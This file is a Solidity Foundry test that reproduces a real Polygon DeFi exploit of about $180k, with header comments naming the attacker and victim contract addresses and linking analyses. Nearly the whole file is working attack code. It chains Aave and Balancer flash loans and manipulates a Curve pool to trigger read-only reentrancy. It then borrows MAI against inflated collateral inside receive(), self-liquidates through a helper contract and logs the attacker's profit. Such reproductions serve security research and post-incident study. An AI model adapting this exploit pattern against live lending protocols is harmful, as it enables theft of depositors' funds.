// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Total Lost: $180k
// Attacker: 0x4206d62305d2815494dcdb759c4e32fca1d181a0
// Attack Contract: 0xEb4c67E5BE040068FA477a539341d6aeF081E4Eb
// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943
// Attack Tx: https://phalcon.blocksec.com/tx/polygon/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558
//            https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558

// @Analyses
// https://quillaudits.medium.com/decoding-220k-read-only-reentrancy-exploit-quillaudits-30871d728ad5
// https://ambergroup.medium.com/mai-finances-oracle-manipulation-vulnerability-explained-55e4b5cc2b82
// https://twitter.com/statemindio/status/1585341766588190720
// https://twitter.com/BeosinAlert/status/1584551399941365763

contract Liquidator {
    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 =
        CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    ICErc20Delegate private constant CErc20Delegate_mMAI_4 = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    BeefyVault private constant beefyVault = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    // https://www.youtube.com/watch?v=w-oVV0Ie3Fw&t=188s&ab_channel=SmartContractProgrammer
    function liquidate(address main) external {
        // use 70_420 miMATIC as repayAmount for liquidation
        miMATIC.approve(address(CErc20Delegate_mMAI_4), type(uint256).max);
        require(
            CErc20Delegate_mMAI_4.liquidateBorrow(main, 70_420 ether, address(CErc20_mmooCurvestMATIC_MATIC_4)) == 0,
            "liquidate failed"
        );

        // redeem beefyVault token (mooCurvestMATIC-MATIC)
        CErc20_mmooCurvestMATIC_MATIC_4.redeem(CErc20_mmooCurvestMATIC_MATIC_4.balanceOf(address(this)));

        // transfer all tokens to main attack contract
        beefyVault.transfer(main, beefyVault.balanceOf(address(this)));
        miMATIC.transfer(main, miMATIC.balanceOf(address(this)));
    }
}

contract MarketExploitTest is Test {
    WETH9 private constant WMATIC = WETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 private constant stMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);

    ILendingPool private constant aaveLendingPool = ILendingPool(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    ICurvePool private constant vyperContract = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 private constant stMATIC_f = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d); // Curve LP token
    BeefyVault private constant beefyVault = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85); // mooCurvestMATIC-MATIC

    IUnitroller private constant unitroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
    IRouter private constant router = IRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    Uni_Router_V3 private constant routerV3 = Uni_Router_V3(0xf5b509bB0909a69B1c207E495f687a596C168E12);

    CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 =
        CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    ICErc20Delegate private constant CErc20Delegate_mMAI_4 = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);

    IERC20 private constant miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); // MAI stablecoin
    IERC20 private constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    function setUp() public {
        vm.createSelectFork("https://polygon.llamarpc.com", 34_716_800); // fork Polygon at block 34716800
        vm.deal(address(this), 0); // set address(this).balance to 0
    }

    function testHack() external {
        _aaveFlashLoan();

        console.log("\n Attacker's profit:");
        console.log("stMATIC:", stMATIC.balanceOf(address(this)) / 1e18);
        console.log("WMATIC:", WMATIC.balanceOf(address(this)) / 1e18);
    }

    function _aaveFlashLoan() internal {
        // flashloan WMATIC from Aave
        address[] memory assets = new address[](1);
        assets[0] = address(WMATIC);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 15_419_963 ether;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation( // Aave callback
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        _balancerFlashLoan();

        WMATIC.approve(address(aaveLendingPool), type(uint256).max); // repay
        return true;
    }

    function _balancerFlashLoan() internal {
        // flashloan WMATIC and stMATIC from Balancer
        address[] memory tokens = new address[](2);
        tokens[0] = address(WMATIC);
        tokens[1] = address(stMATIC);

        uint256[] memory amountsBalancer = new uint256[](2);
        amountsBalancer[0] = 34_580_036 ether; // + 15_419_963 Aave -> 50M debt
        amountsBalancer[1] = 19_664_260 ether;

        balancerVault.flashLoan(address(this), tokens, amountsBalancer, "");
    }

    function receiveFlashLoan( // Balancer callback
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        _exploit();
        _liquidate();
        _sellAll();

        // repay
        stMATIC.transfer(address(balancerVault), 19_664_260 ether);
        WMATIC.transfer(address(balancerVault), 34_580_036 ether);
    }

    function _exploit() internal {
        // add liquidity to WMATIC/stMATIC Curve pool, receive Curve LP tokens stMATIC_f
        WMATIC.approve(address(vyperContract), type(uint256).max);
        stMATIC.approve(address(vyperContract), type(uint256).max);

        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0); // mint 34_640_026 stMATIC_f

        address[] memory market = new address[](1);
        market[0] = address(CErc20_mmooCurvestMATIC_MATIC_4);
        unitroller.enterMarkets(market);

        // deposit 90_000 stMATIC_f and mint 85901 mooCurvestMATIC-MATIC (BeefyVault token) as collateral to Market via Beefy Vault
        stMATIC_f.approve(address(beefyVault), type(uint256).max);
        beefyVault.deposit(90_000 ether);

        // use 85_901 mooCurvestMATIC-MATIC to mint 429_505 Ctokens
        beefyVault.approve(address(CErc20_mmooCurvestMATIC_MATIC_4), type(uint256).max);
        CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));

        // remove liquidity from WMATIC/stMATIC Curve pool: receive WMATIC, stMATIC, miMATIC. This step increases collateral price
        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true); // burn stMATIC_f, trigger receive()
    }

    function _liquidate() internal {
        Liquidator liquidator = new Liquidator();
        miMATIC.transfer(address(liquidator), miMATIC.balanceOf(address(this))); // use MAI to liquidate collateral
        liquidator.liquidate(address(this));

        // take back stMATIC_f
        beefyVault.withdrawAll();

        // remove liquidity from Curve pool 2nd time
        vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true); // burn stMATIC_f, trigger receive()
    }

    receive() external payable {
        //  Borrow MAI with expensive collateral
        // (,uint256 amount,) = unitroller.getAccountLiquidity(address(this));  191
        CErc20Delegate_mMAI_4.borrow(250_000 ether); // 250_000 miMATIC
    }

    function _sellAll() internal {
        // wrap all native MATIC (from remove_liquidity) to WMATIC
        WMATIC.deposit{value: address(this).balance}();

        // swap all miMATIC for WMATIC to repay Aave
        miMATIC.approve(address(router), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(miMATIC);
        path[1] = address(USDC);
        path[2] = address(WMATIC);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            miMATIC.balanceOf(address(this)), 0, path, address(this), type(uint256).max
        );

        // swap some WMATIC for stMATIC to repay Balancer
        WMATIC.approve(address(routerV3), type(uint256).max);
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WMATIC),
            tokenOut: address(stMATIC),
            deadline: type(uint256).max,
            recipient: address(this),
            amountIn: 1355 ether,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        routerV3.exactInputSingle(_Params);
    }
}

/* -------------------- Interface -------------------- */
interface CErc20Interface {
    function mint(uint256 mintAmount) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 amount) external;
    function withdrawAll() external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICErc20Delegate {
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface BeefyVault {
    function deposit(uint256 _amount) external;
    function withdraw(uint256 _amount) external;
    function withdrawAll() external;
    function balance() external view returns (uint256);
    function token() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function cTokensByUnderlying(address) external view returns (address);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface WETH9 {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ICurvePool {
    function remove_liquidity(uint256 _amount, uint256[2] calldata min_amounts, bool donate_dust) external;
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external returns (uint256);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}
